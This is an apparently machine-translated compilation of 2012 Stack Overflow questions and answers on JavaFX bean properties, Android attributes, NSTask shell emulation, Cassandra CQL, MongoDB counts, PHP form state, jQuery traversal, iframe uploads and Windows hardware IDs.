如果我遵循[此处](http://docs.oracle.com/javafx/2/binding/jfxpub-binding.htm)描述的 JavaFX 属性定义，我正在尝试做的事情很好。现在，我想使用 Java Beans 属性适配器从 Java Beans 对象定义属性。由于没有文档，我无法弄清楚它是如何工作的。

假设我有一个简单的 POJO 类：

```
public class Person {
    private String name;

    public String getName() {
        return name;
    }

    public void setName( String name ) {
        this.name = name;
    }
} 
```

和一个 PersonProperty：

```
public class PersonProperty {
    private Person person = new Person();

    private JavaBeanStringProperty name;

    public PersonProperty() throws NoSuchMethodException {
        name = JavaBeanStringPropertyBuilder.create().bean( person ).name( "name" ).build();
    }

    public Person getPerson() {
        return person;
    }

    public void setPerson( Person person ) {
        this.person = person;
    }

    public JavaBeanStringProperty nameProperty() {
        return name;
    }
} 
```

最后是一个测试：

```
public void personTest() throws NoSuchMethodException {
    PersonProperty pp = new PersonProperty();

    pp.getPerson().setName( "A" );
    pp.getPerson().setName( "B" );

    pp.nameProperty().addListener( new ChangeListener<String>() {
        @Override
        public void changed( ObservableValue<? extends String> ov, String t, String t1 ) {
            System.out.println( "from " + t + " to " + t1 );
        }
    } );

    pp.getPerson().setName( "C" );
    pp.getPerson().setName( "D" );
} 
```

我期待看到：

```
from B to C
from C to D 
```

相反，什么也没有出现。

如果我`pp.nameProperty().set("E")`在 personTest 末尾添加，我会得到`from B to E`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T13:08:21.513

我认为这里的问题是 Person 确实是 POJO，但不是 JavaBean：它缺少 PropertyChangeListeners 的钩子。Java 不会神奇地知道 Person#name 何时更改。相反，JavaFX 适配器将寻找一种方法来添加 PropertyChangeListener 并监听名为“name”的属性的事件。如果您将 PropertyChangeSupport 实例添加到您的 Person 类，它将按预期工作：

```
public class Person {
    private String name;
    private PropertyChangeSupport _changeSupport;

    public Person() {
        _changeSupport = new PropertyChangeSupport(this);
    }

    public String getName() {
        return name;
    }

    public void setName( String name ) {
        final String prev = this.name;
        this.name = name;
        _changeSupport.firePropertyChange("name", prev, name);
    }

    public void addPropertyChangeListener(final PropertyChangeListener listener) {
        _changeSupport.addPropertyChangeListener(listener);
    }
} 
```

# android - 来自 AttributeSet.getAttributeValue() 的错误值

> ID：13217410
> 
> 赞同：3
> 
> 时间：2012-11-04T09:24:17.030
> 
> 标签：android

我有一个自定义 SeekBarPreference，它扩展了 DialogPreference。我正在构建自己的布局，但仍在使用父级的属性。

```
<com.example.preference.SeekBarPreference
     android:key="key"
     android:title="title"
     android:summary="summary"
     android:dialogMessage="diag message"
     android:text="text"
     android:max="60"
     android:defaultValue="30" /> 
```

在代码部分，我正在检索 attr.getAttributeValue(androidDns, attrKey)，就像这样

```
mText = attrs.getAttributeValue(androidns, "text");
mMax = attrs.getAttributeIntValue(androidns, "max", 30);
... 
```

问题是在“mText”成员中，我得到了类似“@12341234”的文本，但“mMax”设置正确。

这怎么可能 ？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T10:13:14.457

可能这有帮助

```
context.getString(attrs.getAttributeResourceValue(androidns, "text", 0)); 
```

# objective-c - 如何在一致的环境中循环使用 NSTask 运行终端命令？

> ID：13217415
> 
> 赞同：2
> 
> 时间：2012-11-04T09:24:59.757
> 
> 标签：objective-c, command, nstask, nspipe

我想使用 NSTask 来模拟终端运行命令。代码如下。它可以循环获取输入并返回过程输出。

```
int main(int argc, const char * argv[])
{
  @autoreleasepool {      
    while (1) {
        char str[80] = {0};
        scanf("%s", str);
        NSString *cmdstr = [NSString stringWithUTF8String:str];

        NSTask *task = [NSTask new];
        [task setLaunchPath:@"/bin/sh"];
        [task setArguments:[NSArray arrayWithObjects:@"-c", cmdstr, nil]];

        NSPipe *pipe = [NSPipe pipe];
        [task setStandardOutput:pipe];

        [task launch];

        NSData *data = [[pipe fileHandleForReading] readDataToEndOfFile];

        [task waitUntilExit];

        NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
        NSLog(@"%@", string);

    }
} 
```

我的问题是：当一个循环结束时，运行环境恢复到初始化状态。比如默认运行路径是`/Users/apple`，我运行`cd /`把路径改成`/`，再运行`pwd`，它返回的是 ，`/Users/apple`而不是`/`.

那么我怎样才能`NSTask`完全模拟终端呢？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-04T11:44:42.923

`cd`并且`pwd`是 shell*内置命令*。如果你执行任务

```
/bin/sh -c "cd /" 
```

无法将更改后的工作目录返回到调用进程。如果要设置变量，也会存在同样的问题`MYVAR=myvalue`。

您可以尝试分别解析这些行并更新环境。但是多行命令呢？

```
for file in *.txt
do
    echo $file
done 
```

您无法通过将每一行发送到单独的`NSTask`进程来模拟这一点。

您唯一能做的就是使用 启动*单个* `/bin/sh`进程`NSTask`，并将所有输入行提供给该进程的标准输入。但是你不能使用`readDataToEndOfFile`读取输出，但你必须异步读取（使用`[[pipe fileHandleForReading] waitForDataInBackgroundAndNotify]`）。

简而言之：您只能通过运行（单个）shell 来模拟终端。

**补充：**也许您可以使用以下内容作为您的应用程序的起点。（我省略了所有错误检查。）

```
int main(int argc, const char * argv[])
{
    @autoreleasepool {

        // Commands are read from standard input:
        NSFileHandle *input = [NSFileHandle fileHandleWithStandardInput];

        NSPipe *inPipe = [NSPipe new]; // pipe for shell input
        NSPipe *outPipe = [NSPipe new]; // pipe for shell output

        NSTask *task = [NSTask new];
        [task setLaunchPath:@"/bin/sh"];
        [task setStandardInput:inPipe];
        [task setStandardOutput:outPipe];
        [task launch];

        // Wait for standard input ...
        [input waitForDataInBackgroundAndNotify];
        // ... and wait for shell output.
        [[outPipe fileHandleForReading] waitForDataInBackgroundAndNotify];

        // Wait asynchronously for standard input.
        // The block is executed as soon as some data is available on standard input.
        [[NSNotificationCenter defaultCenter] addObserverForName:NSFileHandleDataAvailableNotification
                                                          object:input queue:nil
                                                      usingBlock:^(NSNotification *note)
         {
             NSData *inData = [input availableData];
             if ([inData length] == 0) {
                 // EOF on standard input.
                 [[inPipe fileHandleForWriting] closeFile];
             } else {
                 // Read from standard input and write to shell input pipe.
                 [[inPipe fileHandleForWriting] writeData:inData];

                 // Continue waiting for standard input.
                 [input waitForDataInBackgroundAndNotify];
             }
         }];

        // Wait asynchronously for shell output.
        // The block is executed as soon as some data is available on the shell output pipe. 
        [[NSNotificationCenter defaultCenter] addObserverForName:NSFileHandleDataAvailableNotification
                                                          object:[outPipe fileHandleForReading] queue:nil
                                                      usingBlock:^(NSNotification *note)
         {
             // Read from shell output
             NSData *outData = [[outPipe fileHandleForReading] availableData];
             NSString *outStr = [[NSString alloc] initWithData:outData encoding:NSUTF8StringEncoding];
             NSLog(@"output: %@", outStr);

             // Continue waiting for shell output.
             [[outPipe fileHandleForReading] waitForDataInBackgroundAndNotify];
         }];

        [task waitUntilExit];

    }
    return 0;
} 
```

# iphone - iOS：由于 [OS_dispatch_data notifyDelegateOnWillFinish] 导致应用程序崩溃？

> ID：13217422
> 
> 赞同：0
> 
> 时间：2012-11-04T09:26:04.670
> 
> 标签：iphone, ios, ipad, crash

在某些设备上，由于以下错误，我的应用程序崩溃： NSInvalidArgumentException: -[OS_dispatch_data notifyDelegateOnWillFinish]: unrecognized selector sent to instance 0x2082d7a0

我无法重现此行为。我使用 Flurry 分析跟踪崩溃，一些用户似乎遇到了这个问题。

我试图用谷歌搜索这个错误，但没有成功。所以希望这里有人知道这意味着什么。

非常感谢！！

编辑：我的代码中我使用调度的唯一部分是这个

```
- (void) callDelegateOnMainThread: (SEL) selector withArg: (id) arg error: (NSError*) err
{
    dispatch_async(dispatch_get_main_queue(), ^(void)
               {
                   [self callDelegate: selector withArg: arg error: err];
               });
} 
```

EDIT2：这里是 callDelegate 方法：

```
- (void) callDelegate: (SEL) selector withArg: (id) arg error: (NSError*) err
{
    assert([NSThread isMainThread]);
    if([delegate respondsToSelector: selector])
    {
        if(arg != NULL)
        {
            [delegate performSelector: selector withObject: arg withObject: err];
        }
        else
        {
            [delegate performSelector: selector withObject: err];
        } 
    }
    else
    {
        DebugLog(@"Missed Method");
    }
} 
```

这段代码有问题吗？请指教！太感谢了！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T09:42:45.120

我认为你还没有在你的类中实现 notifyDelegateOnWillFinish 方法。

您应该在调用委托方法之前添加检查。

```
if([delegate respondsToSelector:selector])
    [self callDelegate: selector withArg: arg error: err]; 
```

# java - 使用 Java 访问 HTML5 本地存储

> ID：13217423
> 
> 赞同：5
> 
> 时间：2012-11-04T09:26:11.907
> 
> 标签：java, html, local-storage

是否可以直接使用 Java 访问 localstorage 对象？如果是怎么办？

更新：我知道 localstorage 是客户端，java 是服务器端，但我在网上读到 GWT 有允许读取 localstorage 的 api。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-04T12:29:12.323

顾名思义，本地存储在本地存储信息，这意味着在浏览器中，在客户端。servlet 过滤器在服务器端执行。无法在服务器端访问本地存储。

如果您需要从 servlet 过滤器访问存储在本地存储中的某个 ID，则从 JavaSCript 中的本地存储中检索此 ID，并向服务器发送包含此 ID 的请求。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-12-04T12:17:08.550

Localstorage 是更好的替代 thamn Cookie。所以，我也在等待没有外部库的 JAVA 支持来访问本地 Web 存储。现在我正在使用 sellenium 支持。请看[https://gist.github.com/dariodiaz/5079695](https://gist.github.com/dariodiaz/5079695)

# ajax - ajax 对 JSF inputtext 做了什么？

> ID：13217424
> 
> 赞同：1
> 
> 时间：2012-11-04T09:26:13.957
> 
> 标签：ajax, jsf-2

我有一个接受名称的输入文本框，以相反的顺序处理名称，然后将其输出到另一个文本框。每当我输入值并单击页面上的任意位置（意味着从文本框失去焦点）时，输出文本框将自动更新。

当我打开源代码时，我发现了类似下面的代码，我可以知道 ajax 对 inputtext 组件有什么作用吗？

```
<h:inputText id="name" value="#{helloBean.name}">
  <f:ajax render="printMyName"/>
</h:inputText>

<h:outputText id="printMyName" value="#{helloBean.reverseName}"/> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T10:04:31.360

Taken from [Learning JSF2: Ajax in JSF – using f:ajax tag](http://mkblog.exadel.com/2010/04/learning-jsf-2-ajax-in-jsf-using-fajax-tag/)

> Sending an Ajax request
> 
> JSF comes with one tag to send an Ajax request, the tag is called f:ajax. This tag is actually a client side behavior. Being a behavior implies it’s never just used by itself on a page, it is always added as a child tag (behavior) to another UI component (or can even wrap several components). Let’s use a small echo application to demonstrate usage of this tag.

```
<h:form> 
  <h:panelGrid> 
      <h:inputText value="#{bean.text}" > 
         <f:ajax event="keyup" render="text"/> 
      </h:inputText> 
      <h:outputText id="text" value="#{bean.text}" /> 
   </h:panelGrid> 
</h:form> 
```

> Code snippet above takes care of firing an Ajax request based on onkeyup event. Notice the actual event name is keyup. This takes care of firing an Ajax request. Next we need to figure out how to do partial view rendering.

**Attribute Description event:**

> String on which event Ajax request will be fired. If not specified, a default behavior based on parent component will be applied. The default event is action for ActionSource (ie: button) components and valueChange for EditableValueHolder components (ie: input). action and valueChange are actual String values that can be applied applied event attribute.

# python - 使用 cql 从 python 插入到 cassandra

> ID：13217434
> 
> 赞同：15
> 
> 时间：2012-11-04T09:28:17.903
> 
> 标签：python, cassandra, cql

我打算将数据插入到具有复合键的 CF 下方。

```
CREATE TABLE event_attend (
    event_id int,
    event_type varchar,
    event_user_id int,
    PRIMARY KEY (event_id, event_type)    #compound keys...
); 
```

但是我不能使用 cql 从 python 向这个 CF 插入数据。(http://code.google.com/a/apache-extras.org/p/cassandra-dbapi2/)

```
import cql
connection = cql.connect(host, port, keyspace)
cursor = connection.cursor()
cursor.execute("INSERT INTO event_attend (event_id, event_type, event_user_id) VALUES (1, 'test', 2)", dict({}) ) 
```

我得到以下回溯：

```
Traceback (most recent call last):
File "./v2_initial.py", line 153, in <module>
  db2cass.execute()
File "./v2_initial.py", line 134, in execute
  cscursor.execute("insert into event_attend (event_id, event_type, event_user_id ) values (1, 'test', 2)", dict({}))
File "/usr/local/pythonbrew/pythons/Python-2.7.2/lib/python2.7/site-packages/cql-1.4.0-py2.7.egg/cql/cursor.py", line 80, in execute
  response = self.get_response(prepared_q, cl)
File "/usr/local/pythonbrew/pythons/Python-2.7.2/lib/python2.7/site-packages/cql-1.4.0-py2.7.egg/cql/thrifteries.py", line 80, in get_response
  return self.handle_cql_execution_errors(doquery, compressed_q, compress)
File "/usr/local/pythonbrew/pythons/Python-2.7.2/lib/python2.7/site-packages/cql-1.4.0-py2.7.egg/cql/thrifteries.py", line 98, in handle_cql_execution_errors
  raise cql.ProgrammingError("Bad Request: %s" % ire.why)
cql.apivalues.ProgrammingError: Bad Request: unable to make int from 'event_user_id' 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-11-04T22:15:04.113

看起来您正在尝试遵循以下示例： http: [//pypi.python.org/pypi/cql/1.4.0](http://pypi.python.org/pypi/cql/1.4.0)

```
import cql
con = cql.connect(host, port, keyspace)
cursor = con.cursor()
cursor.execute("CQL QUERY", dict(kw='Foo', kw2='Bar', kwn='etc...')) 
```

但是，如果您只需要插入一行（如在您的问题中），只需删除空的 dict() 参数。

此外，由于您使用的是复合键，请确保您使用 CQL3 [http://www.datastax.com/dev/blog/whats-new-in-cql-3-0](http://www.datastax.com/dev/blog/whats-new-in-cql-3-0)

```
connection = cql.connect('localhost:9160', cql_version='3.0.0') 
```

以下代码应该可以工作（如果需要，只需将其调整为 localhost）：

```
import cql
con = cql.connect('172.24.24.24', 9160,  keyspace, cql_version='3.0.0')
print ("Connected!")
cursor = con.cursor()
CQLString = "INSERT INTO event_attend (event_id, event_type, event_user_id) VALUES (131, 'Party', 3156);"
cursor.execute(CQLString) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2018-12-06T12:56:31.640

对于 python 2.7、3.3、3.4、3.5 和 3.6 进行安装，您可以使用

```
 $ pip install cassandra-driver 
```

在python中：

```
 import cassandra 
```

Documentation can be found under [https://datastax.github.io/python-driver/getting_started.html#passing-parameters-to-cql-queries](https://datastax.github.io/python-driver/getting_started.html#passing-parameters-to-cql-queries)

# javascript - Pymongo 使用 map reduce 计算所有存在字段的文档

> ID：13217436
> 
> 赞同：1
> 
> 时间：2012-11-04T09:28:27.570
> 
> 标签：javascript, mongodb, pymongo, nosql

我正在尝试使用 Map+Reduce 计算存在某个字段（在本例中为“国家”字段）的所有文档，唯一对我有用的解决方案是：

```
mapper = Code("""
function () {
if (typeof this.country != 'undefined') { 
    var key = 1
    emit(key, {count: 1})
    };
};
""") 
```

我对键并不感兴趣，只要字段存在，所以我刚刚通过了 1。但我确定那是错误的。

```
reducer = Code("""
function (key, values) {
    var sum = 0;
    values.forEach(function (value) {
        sum += value['count'];
    });
    return {count: sum};
};
""") 
```

然后调用 map_reduce：

```
results = dbHandle.cards.map_reduce(mapReduce.mapper, mapReduce.reducer, "resultsMR")
for doc in results.find():
    print "Found %s documents." % int(doc.get('value').get('count')) 
```

另外我正在考虑如何获取创建日期大于其他日期的文档数量，我应该在 map_reduce 函数中使用“查询”选项吗？

```
query = {"foundationDate":{"$gt":datetime.datetime(2012, 1, 1, 00, 00, 00)}} 
```

谢谢 ：）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-15T15:05:46.637

Per **Chien-Wei Huang**评论，为什么不使用内置功能，例如

```
db.somName.find({"country":{"$exists":True}}).count() 
```

否则，如果您想要一些令牌映射减少代码，您只需通过**group()**函数模拟计数功能，例如

```
db.somName.group(
     { cond: { "country" : {$exists : true} }
      , key: { }
      , initial: {count : 0}
      , reduce: function(doc, out){ out.count++}
     }
  ); 
```

Note: If you also want a count by country value, then stick the following in the key: , key { "country" : 1 }

# php - 在同一页面上提交表单时如何预填充下拉列表？

> ID：13217440
> 
> 赞同：2
> 
> 时间：2012-11-04T09:29:05.603
> 
> 标签：php, html, forms, session

我使用带有下拉列表的表单制作了一个过滤器。过滤器用于过滤来自 mySQL 数据库的结果。表单与结果在同一页面上处理。我想让过滤器下拉列表在过滤结果后保留过滤器参数。

我过去通过使用会话来完成此操作，但是那是我使用另一个页面来处理查询的时候。我试图应用同样的理论，但它不起作用。我已经搜索了这个网站以及谷歌，我只找到了与一个单独的页面相关的答案以进行处理。

目前，我拥有的代码只会在提交两次后才预填充表单。第一次提交时，它显示“选择...”的默认设置

以下是我的代码的相关部分：

```
session_start();
if(isset($_SESSION['submitted_filter_values']))
{
extract($_SESSION['submitted_filter_values']);
}

<form action="#filter" method="post" name="filter">
<table>

<tr>
<td>
<select name="prefix">
<option value="">Select...</option>
<option <?php if(isset($prefix) && $prefix == "PDM"){echo "selected=\"selected\"";} ?> value="PDM">PDM</option>
<option <?php if(isset($prefix) && $prefix == "TB"){echo "selected=\"selected\"";} ?> value="TB">TB</option>
<option <?php if(isset($prefix) && $prefix == "JNL"){echo "selected=\"selected\"";} ?> value="JNL">JNL</option>
</select>
</td>
</tr>

<tr align="center">
<td colspan="2"><input type="submit" class="btn_150x30" name="submit" value="Filter Results"></td>
</tr>

</table>
</form>

$_SESSION['submitted_filter_values'] = $_REQUEST; 
```

我曾尝试将会话变量放在不同的位置，但没有奏效。我认为刷新页面可能会起作用，但后来我认为它会像我两次提交表单时一样有效地删除过滤器。需要注意的有趣的一点是，它非常一致，因为它在我每第二次提交时都会正常工作，所以每一次奇数提交它都不会填充，而每一个偶数提交它都会填充。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T09:42:38.817

试试这个：

```
<?php 
    session_start();

    if(isset($_POST['prefix'])){
        // if the form has been posted use it
        $prefix = $_POST['prefix']; // <------ RUN SOME VALIDATION HERE!!!!!!!
        $_SESSION['submitted_filter_values'] = $prefix; // update the session var

    }elseif(isset($_SESSION['submitted_filter_values'])){
        // if the form hasn't been posted then look in the $_SESSION
        $prefix = $_SESSION['submitted_filter_values']; // <------ RUN SOME VALIDATION HERE (trust no one!)!!!!!!!
    }

?>
    <form action="#filter" method="post" name="filter">
        <table>

            <tr>
                <td>
                    <select name="prefix">
                        <option value="">Select...</option>
                        <option<?php if($prefix == "PDM"){echo " selected=\"selected\"";} ?> value="PDM">PDM</option>
                        <option<?php if($prefix == "TB"){echo " selected=\"selected\"";} ?> value="TB">TB</option>
                        <option<?php if($prefix == "JNL"){echo " selected=\"selected\"";} ?> value="JNL">JNL</option>
                    </select>
                </td>
            </tr>
            <tr align="center">
                <td colspan="2">
                    <input type="submit" class="btn_150x30" name="submit" value="Filter Results" />
                </td>
            </tr>

        </table>
    </form> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T09:43:37.007

这是您遇到的请求和会话问题。如果我按照你的脚本处理对了，你有以下情况：

首次提交时，`submitted_filter_values`未设置会话。您将看到默认条目，`$prefix`保持未设置。

在第二次提交时，您在输出选择标签`submitted_filter_values` *后设置会话。*由于该顺序，您仍然会看到默认条目。

在第三次提交时，您将看到第二次提交的过滤器。

在第四次提交时，您将看到第三次提交的过滤器。等等等等。

如果您不提交而只是通过 GET 请求，则该值仍然存在，但是您还将会话设置`submitted_filter_values`回默认值，因为`$_REQUEST`不再包含`prefix`任何内容。

看到这个顺序也有助于改变脚本。一条经验法则是在脚本之上处理输入变量（设置与否）。在编写@Chris 时已经为此提供了代码——我会做的有点不同，但他的例子展示了它是如何工作的。

我首先会在顶部定义过滤器，使用请求和会话逻辑一个接一个地处理它们，然后输出表单。这样做的好处是您可以更改顶部的数据逻辑和输出中的输出逻辑。

```
<?php
session_start();

/**
 * define your filter(s)
 */
$filters = array(
    'prefix' => array(
        'value' => null,
        'list' => array('PDM', 'TB', 'JNL')
    )
);

$filtersSessionName = 'submitted_filter_values';

/**
 * process the state of your filter(s) with request input and
 * session state
 */
foreach($filters as $name => $filter) {

    // does request has filter value set?
    if (isset($_REQUEST[$name])) {
        $requestValue = $_REQUEST[$name];
        // does it validate?
        if (in_array($requestValue, $filter['list'])) {
            $filter['value'] = $requestValue;
            $_SESSION[$filtersSessionName][$name] = $requestValue;
            continue;
        }
    }

    // does the session has filter value set?
    if (isset($_SESSION[$filtersSessionName][$name])) {
        $sessionValue = $_SESSION[$filtersSessionName][$name];
        // does it validate?
        if (in_array($sessionValue, $filter[$list])) {
            $filter['value'] = $sessionValue;
            continue;
        }
    }
}

/**
 * output the filter(s) in the form
 */
?>

<form action="#filter" method="post" name="filter">
    <table>
        <?php foreach($filters as $name => $filter) { ?>
            <tr>
                <td>
                    <select name="<?php echo $name; ?>">
                        <option value="">Select ...</option>
                        <?php foreach($filter['values'] as $label) {
                            $selected = $filter['value'] === $label;
                        ?>
                            <option <?php if ($selected) { echo 'selected="selected"';} ?> value="<?php echo $label ?>">
                                <?php echo $label ?>
                            </option>
                        <?php } ?>
                    </select>
                </td>
            </tr>
        <?php } # foreach filters ?>
        <tr align="center">
            <td colspan="2"><input type="submit" class="btn_150x30" name="submit" value="Filter Results"></td>
        </tr>
    </table>
</form> 
```

这可以通过对过滤器列表使用键/值对来进一步改进，以便过滤器的标签可以与正在提交的值不同。此外，`$_REQUEST`变量也可以加上前缀，以便过滤器的名称将与请求变量一起命名，就像它已经在会话中完成一样。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T09:46:55.397

您需要改变处理`$REQUEST`结果的方式。

```
<?php
session_start();
if (isset($REQUEST))  // do we have a submitted request?
{         // yes -> save it in session

    $_SESSION['submitted_filter_values']['prefix'] = $REQUEST['prefix'];
    $prefix = $REQUEST['prefix'];

} else {  // no -> try to retrieve it from the session

   if(isset($_SESSION['submitted_filter_values']))
   {
      $prefix = extract($_SESSION['submitted_filter_values']['prefix']);
   }

}
?>

<form action="#filter" method="post" name="filter">
<table>

<tr>
<td>
<select name="prefix">
<option value="">Select...</option>
<option <?php if(isset($prefix) && $prefix == "PDM"){echo "selected=\"selected\"";} ?> value="PDM">PDM</option>
<option <?php if(isset($prefix) && $prefix == "TB"){echo "selected=\"selected\"";} ?> value="TB">TB</option>
<option <?php if(isset($prefix) && $prefix == "JNL"){echo "selected=\"selected\"";} ?> value="JNL">JNL</option>
</select>
</td>
</tr>

<tr align="center">
<td colspan="2"><input type="submit" class="btn_150x30" name="submit" value="Filter Results"></td>
</tr>

</table>
</form> 
```

关于`extract`，将它与不受信任的输入（如 $REQUEST 数组）一起使用是非常糟糕的做法，它可能包含不需要的值。想象一下，有人伪造了一个以该页面为目标的 URL，其中一些参数覆盖了脚本中的某些值，因为您使用 $REQUEST，您将提取这些值并可能用危险值覆盖您的变量。这就是为什么我只复制`prefix`$REQUEST 数组中的值。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-04T09:43:52.120

我认为，根据您当前的代码段，您需要设置代码序列如下

```
if(isset($_REQUEST))
{
   $_SESSION['submitted_filter_values'] = $_REQUEST;
}

if(isset($_SESSION['submitted_filter_values']))
{
   extract($_SESSION['submitted_filter_values']);
   unset($_SESSION['submitted_filter_values']);
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-05T04:39:50.057

在意识到会话对我的应用程序来说不是一个好主意后，因为它只在一个页面上使用，而不是在整个站点上使用，我采取了一种新的方法来解决这个问题。

在我的过滤器顶部，每个选项都有这个：

```
if(isset($_POST['prefix']))
    {
    $prefix = $_POST['prefix'];
    } 
```

然后在我的下拉列表中，每个选项都有这个：

```
<option <?php if(isset($prefix) && $prefix == "PDM"){echo "selected=\"selected\"";} ?> value="PDM">PDM</option> 
```

# javascript - jquery，如何在 css 范围内使用 nextAll()

> ID：13217444
> 
> 赞同：0
> 
> 时间：2012-11-04T09:29:34.627
> 
> 标签：javascript, jquery, jquery-selectors

HTML：

```
<div class="my_1"></div>

<div class="my_big">     
      <div class="small" id="id_1"></div>      
      <div class="small" id="id_2"></div>     
      <div class="small" id="id_3"></div>      
      <div class="small" id="id_4"></div>      
</div> 
```

javascript:

```
var css_scope=$(".my_big");
var next_div=$(".my_1").nextAll('.small',css_scope).first();

console.log(" \n next div = "+ next_div.attr('id')); 
```

控制台显示`undefined`。`my_big`但是，如果我从 html中排除div 并`var next_div`在 javascript 中定义如下：

`var next_div=$(".my_1").nextAll('.small').first();`,

得到预期的输出。

如何`nextAll()`使用提到的 css 作用域？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T11:01:05.400

您*无法*使用`.small`，因为它们不是兄弟姐妹`my_1`。`nextAll()`您可以使用以下选择器来访问它。

```
// Get the first element matching ".small" inside an element matching ".my_big"
// that comes immediately after an element matching ".my_1"

var next_div = $('.my_1 + .my_big > .small:first')​; 
```

检查这个**演示：http:** [//jsfiddle.net/q6XKR/](http://jsfiddle.net/q6XKR/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T11:01:28.537

如果要访问`my_big`div 中的第一个元素，则无需带入`my_1`场景。

```
var next_div = $('.my_big').find('.small').first();

console.log(" \n next div = "+ next_div.attr('id')); 
```

希望它能让您对在 jQuery 中遍历元素有所了解。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T10:55:18.387

`.nextAll`用于查找所有下一个兄弟姐妹，您应该`.small`从`nextAll`.

```
var next_div=$(".my_1").nextAll('.my_big').find('.small').first(); 
```

# jquery - 动态创建 iframe，附加带有输入类型文件的表单，触发浏览并自动提交表单

> ID：13217445
> 
> 赞同：0
> 
> 时间：2012-11-04T09:29:39.253
> 
> 标签：jquery, html, file-upload, ajax-upload

我正在尝试实现*ajax-like-file-upload-using-hidden-iframe*。显然有许多插件可用于此目的，但我认为我的要求有点不同。所以我试图实现它如下：

HTML：

```
 <!DOCTYPE>
    <html> 
    <style>
        .file_upload{cursor:pointer;color:blue;text-decoration:underline;}
    </style>
    <body>
        <div class="file_upload" id="upload1" name="doc1" >Upload doc1</div>
        <div class="file_upload" id="upload2" name="doc2" >Upload doc2</div>
        <div id="iframe_div"></div>
    </body>
    </html> 
```

查询：

```
$(document).ready(function(){
                $(".file_upload").click(function(event){
                    var itr = $(".file_upload").length;
                    var iframeName = $(this).attr('name') + itr;
                    var iframeId = $(this).attr('id') + itr;
                    $('<iframe />', {
                        name: iframeName,
                        id: iframeId,
                        src: 'about:blank'
                    }).appendTo('#iframe_div');
                    //append form to body of the iframe
                    $('<form>',{
                        name: iframeName + '_form',
                        id: iframeId + '_form',
                        action: 'actionName.action',
                        method: 'POST',
                        enctype: 'multipart/form-data'
                    }).appendTo('#' + iframeId).find('body');
                    //append file input
                    //trigger 'click' using $('#file_fld_id').trigger('click')
                    //browse to file and use 'onchange' to trigger
                                      auto-submit of  the form
                    //replace the 'file-upload' div with a progress bar...
                   //remove the iframe when upload is complete
                });
            }); 
```

**简而言之：**

**1.点击一个div打开浏览窗口。**

**2\. 使用隐藏 iframe 上传文件。**

但我认为我知识渊博（在 jquery 中）无法实现这一点。或者真的可以吗？？如果是这样，请帮助/重定向/任何东西......为什么这个明显的功能必须通过变通方法来实现（flash，obex，silverlight，......）..ahhh。

编辑（澄清一点）：

正如我提到的'我的 iframe 是动态的'......原因是我的文件输入应该在一个已经存在的表单中，并带有一个单独的操作（struts2）。我还有另一个文件上传操作。由于我们不能在表单中使用表单，所以我正在尝试在现有表单中使用 div 来通过其他操作上传文件。我有不同的文档要在这个表格中单独上传。所以基本上我试图用一个单独的 iframe 替换每个 div（一个用于文件上传），它有自己的表单（但相同的操作会处理上传），当用户在浏览时点击“打开”时，它会自动提交文件。我希望我现在更清楚了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T10:57:26.187

好的，[这里](http://jsfiddle.net/oceog/wu4mr/)是示例。它可能不适用于所有浏览器，我刚刚检查了 chrome 22，它不适用于不同的域（同源策略）

HTML：

```
<div id="hello">You will be asked to submit a file</div>
<div id="temp">
<iframe>

</iframe>
</div>
<button id="SelectFile">Select File</button>
<div id="filedialog">
    <form method="POST" action="/test.php" >
   <input type="file">
    </form>
</div>
​ 
```

CSS

```
#temp ,#filedialog{
 display:none;   
} 
```

js：

```
var frame = $('#temp iframe');
var frameinit = function() {
    frame.contents().find('body').children().remove();
    frame.contents().find('body').append($('#filedialog').html());
    frame.contents().find('input').change(function() {
        frame.contents().find('form').submit();
    });
};
frameinit();
$('#SelectFile').click(

function() {
    frame.contents().find('input').click();
    frame.load(function() {
        //JSfiddle's error message from iframe
        var data = frame.contents().find('.pageHeader');
        $('body').append($('<div>').html(data));
        frameinit();
    });
});​
​ 
```

请注意，如果没有真正的浏览器点击，您将无法触发点击文件对话框。

# winapi - 如何在不使用 WMI 的情况下获取硬件信息？

> ID：13217448
> 
> 赞同：2
> 
> 时间：2012-11-04T09:30:01.240
> 
> 标签：winapi

我正在为我的应用程序编写激活码，我需要为密钥文件提供有关许可计算机的信息，我需要检索有关某些设备的信息，例如处理器 ID 和磁盘驱动器序列号，以及 BIOS 序列号，等等在一些设备上，但这些是主要的。

我需要将该方法与用另一种语言编写的另一个应用程序结合起来，所以我不能使用 WMI，但我可以使用 winapi。

有没有办法使用winapi获取物理数据？如果是这样，那么如何？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T10:31:49.507

如果您能够调用 Windows API 函数，那么您可以使用 WMI。毕竟，WMI 接口是 Windows API 的一部分。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-04T09:38:47.163

看一下[Win32_BIOS](http://msdn.microsoft.com/en-us/library/windows/desktop/aa394077%28v=vs.85%29.aspx)类和[PROCESSOR_POWER_INFORMATION](http://msdn.microsoft.com/en-us/library/windows/desktop/aa373184%28v=vs.85%29.aspx)结构。

在没有 WMI 的情况下访问主板信息似乎不适用于当前的方法。在这里你可以找到一个类似的问题： [Access Motherboard information without using WMI](https://stackoverflow.com/questions/1262404/access-motherboard-information-without-using-wmi)

